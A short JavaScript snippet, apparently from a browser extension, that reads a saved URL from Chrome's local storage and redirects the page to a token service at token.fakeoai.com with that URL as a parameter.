chrome.storage.local.get(['url'], function ({ url }) {
  window.location.href = `https://token.fakeoai.com?url=${encodeURIComponent(url)}`
})
